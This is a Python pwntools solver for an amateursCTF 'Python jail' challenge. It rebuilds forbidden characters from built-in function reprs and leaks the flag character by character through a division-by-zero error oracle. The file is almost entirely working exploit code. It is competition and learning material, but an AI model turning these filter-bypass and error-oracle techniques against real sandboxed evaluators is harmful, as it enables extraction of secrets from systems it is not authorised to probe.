from pwn import *

# initializations
flag = "amateursCTF{"

# helper function
def send_code(code: str):
    p.sendline(code.encode())
    return p.recvuntil(b'Give code: ').decode().split("Give")[0]


# start connection and flush
p = remote('amt.rs', 31672)
p.sendline(b'_')
p.recvuntil(b'Give code: ')
p.recvuntil(b'Give code: ')



### DEFINE PRIMITIVES ###
# base numbers
send_code("a='b'=='b'")                 # a = True
send_code("b=~a")                       # b = -2
send_code("c=a+b")                      # c = -1
send_code("d=c+a")                      # d = 0
send_code("f=d+a")                      # f = 1

# multiples of f give 2 - 10, 14
send_code("ff=f+f")                     # ff = 2
send_code("fff=ff+f")                   # fff = 3
send_code("ffff=fff+f")                 # ffff = 4
send_code("fffff=ffff+f")               # fffff = 5
send_code("ffffff=fffff+f")             # ffffff = 6
send_code("fffffff=ffffff+f")           # fffffff = 7
send_code("ffffffff=fffffff+f")         # ffffffff = 8
send_code("fffffffff=ffffffff+f")       # fffffffff = 9
send_code("ffffffffff=fffffffff+f")     # ffffffffff = 10
send_code("ffffffffffffff=ffffffffff+ffff")     # ffffffffffffff = 14

# Retrieve unusable ASCII chars
send_code("g='%s'%ord")                 # g = '<built-in function ord>'
send_code("z=g[ffff]")                  # z = 'l'
send_code("y=g[fff]")                   # y = 'i'
send_code("x=g[fffff]")                 # x = 't'
send_code("w='%x'%ffffffffffffff")      # w = 'e'

# define alphabet dictionary
alphabet = {
    'a': "'a'", 'b': "'b'", 'c': "'c'", 'd': "'d'", 'e': "w", 'f': "'f'", 'g': "'g'", 'h': "'h'", 'i': "y", 'j': "'j'", 'k': "'k'", 'l': "z", 'm': "'m'", 'n': "'n'", 'o': "'o'", 'p': "'p'", 'q': "'q'", 'r': "'r'", 's': "'s'", 't': "x", 'u': "'u'", 'v': "'v'", 'w': "'w'", 'x': "'x'", 'y': "'y'", 'z': "'z'", 'A': "'A'", 'B': "'B'", 'C': "'C'", 'D': "'D'", 'E': "'E'", 'F': "'F'", 'G': "'G'", 'H': "'H'", 'I': "'I'", 'J': "'J'", 'K': "'K'", 'L': "'L'", 'M': "'M'", 'N': "'N'", 'O': "'O'", 'P': "'P'", 'Q': "'Q'", 'R': "'R'", 'S': "'S'", 'T': "'T'", 'U': "'U'", 'V': "'V'", 'W': "'W'", 'X': "'X'", 'Y': "'Y'", 'Z': "'Z'", '_': "'_'"
}


"""
Brute force letter-by-letter, with the goal of triggering "division by zero" error.
I'm pretty much trying:

    1 / (_[0] == 'f')

because if `_[0] == 'f'` evaluates to True, then we get 1 / 1. Otherwise, we
get 1 / 0, which is a division by zero error.

Since we defined numbers and letters, we can use them to brute force the flag.
"""
while '}' not in flag:
    current_index = len(flag)
    for letter in alphabet:
        # define payload
        index = "ffffffffff+"*(current_index//10)+"f"*(current_index%10)
        if index[-1] == "+":
            index = index[:-1]

        payload = f"p=_[{index}]=={alphabet[letter]}"
        #print(payload)
        send_code(payload)

        # check if division by zero error
        out = send_code("f/p")

        if 'zzzzzzzzzzzzz' not in out:
            flag += letter
            print(flag)
            break

p.close()

"""
Functions I can use:
- round
- vars
- sum
- pow
- ord
- max
- map
- hash
- chr
- any
- abs
"""